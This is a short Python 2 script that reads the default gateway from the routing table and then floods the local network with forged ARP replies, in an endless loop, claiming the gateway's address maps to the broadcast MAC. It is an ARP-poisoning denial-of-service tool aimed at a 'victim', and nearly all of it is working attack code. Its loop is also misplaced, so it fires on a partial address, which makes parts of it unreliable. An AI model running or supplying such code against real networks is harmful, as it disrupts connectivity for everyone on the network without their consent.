import socket
import sys, subprocess
from binascii import hexlify
from struct import *

def get_default_gw():
    command = "netstat -rn -f inet"
    routes_out = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    routes = routes_out.stdout.read()
    for line in routes.splitlines():
        print line
        if 'default' in line:
            print line
            params = line.rsplit(' ')
            default_gw = params[2]
            device = params[4]
    return default_gw, device
	
	
def eth_addr (a) :
   b = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(a[0]) , ord(a[1]) , ord(a[2]), ord(a[3]), ord(a[4]) , ord(a[5]))
   return b

def hex_mac_addr (a) :
   b = "%.2s:%.2s:%.2s:%.2s:%.2s:%.2s" % (chr(a[0]) , chr(a[1]) , chr(a[2]), chr(a[3]), chr(a[4]) , chr(a[5]))
   return b

def scream(victim_ip, device):
    scream_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    scream_sock.bind((device, 0))
    victim_ip = victim_ip.split(".")
    hexip = []
    for a in range(0,len(victim_ip)):
        hexip.append(int(victim_ip[a]))

        eth_pkt = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x69, 0xbb, 0xff, 0xce, 0xbe, 0xef, 0x08, 0x06]
        arp_pkt = [0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x02 ]
        arp_pkt_sndr_mac = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff ]
        arp_pkt_sndr_ip = [0xc0, 0xa8, 0x01, 0x01 ]
        arp_pkt_dst_mac = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff ]
        arp_pkt_dst_ip = [0xc0, 0xa8, 0x01, 0x02 ]
	
        arp_pkt_sndr_ip = hexip
        arp_pkt_dst_ip = hexip

        eth_payload = "".join(map(chr, eth_pkt))
        arp_payload = "".join(map(chr, arp_pkt + arp_pkt_sndr_mac + arp_pkt_sndr_ip
 + arp_pkt_dst_mac + arp_pkt_dst_ip))
        print "SCREAMING: " + str(victim_ip) + " has address ff:ff:ff:ff:ff:ff on ff:ff:ff:ff:ff"
        while True:
            scream_sock.send(eth_payload + arp_payload)
        scream_sock.close()
        exit(0)

default_gw, device = get_default_gw()
scream(default_gw, device)
